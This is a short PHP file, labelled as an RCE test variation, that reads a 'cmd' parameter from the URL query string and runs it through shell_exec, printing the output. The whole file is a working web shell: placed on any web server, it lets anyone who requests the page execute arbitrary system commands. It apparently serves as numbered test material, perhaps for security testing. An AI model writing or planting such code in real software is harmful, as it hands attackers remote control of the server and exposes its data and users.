<?php
// RCE test variation #262
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>